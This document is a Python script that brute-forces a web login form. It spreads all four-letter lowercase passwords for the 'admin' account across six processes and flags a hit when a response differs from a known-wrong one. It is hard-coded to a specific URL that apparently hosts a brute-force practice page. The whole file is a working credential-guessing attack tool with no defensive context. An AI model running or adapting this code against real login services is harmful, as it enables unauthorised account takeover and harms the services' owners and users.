import requests
from requests.exceptions import ConnectTimeout
import time
import multiprocessing as mp

class PasswordCracker:
    def __init__(self, link, username, password):
        self.abeceda = "abcdefghijklmnopqrstuvwxyz"
        self.number = 6
        self.password = password
        self.username = username
        self.link = link
        self.possibilities = [a + b + c + d for a in self.abeceda for b in self.abeceda for c in self.abeceda for d in self.abeceda]
        self.confirm = requests.post(self.link, data={"username": self.username, "password": self.password})
        self.confirm = self.confirm.text

    def trying(self, i, possibilities, correct, zoz):
        r = requests.session()
        first = (((len(possibilities) // self.number) * (i)))
        last = (len(possibilities) // self.number) * (i + 1)
        for password in possibilities[first:last:]:
            if not correct.is_set():
                try:
                    unknown = r.post(self.link, data={"username": self.username, "password": password, "action": ""})
                except ConnectTimeout:
                    print("timeout "+str(i))
                    time.sleep(5)
                    unknown = r.post(self.link, data={"username": "admin", "password": password, "action": ""})
                if unknown.text != self.confirm:
                    print(f"found password {password} {unknown}")
                    correct.set()
                    zoz.append(password)
                    break
                if possibilities.index(password) % 1000 == 0:
                    print("1000 - "+str(i))
                elif possibilities.index(password) % 10000 == 0:
                    print("10000 - "+str(i))
            else:
                break
        print("done "+str(i))

    def crack_password(self):
        process = []
        if __name__ == "__main__":
            manager = mp.Manager()
            correct = mp.Event()
            zoz = manager.list()
            for i in range(self.number):
                process.append(mp.Process(target=self.trying, args=(i, self.possibilities, correct, zoz)))
            for i in process:
                i.start()
            correct.wait()
            for i in process:
                i.terminate()
            for i in process:
                i.join()
            print(zoz)
            print("all done")

cracker = PasswordCracker("https://dudo.gvpt.sk/bruteforce/account/login", "admin", "a")
cracker.crack_password()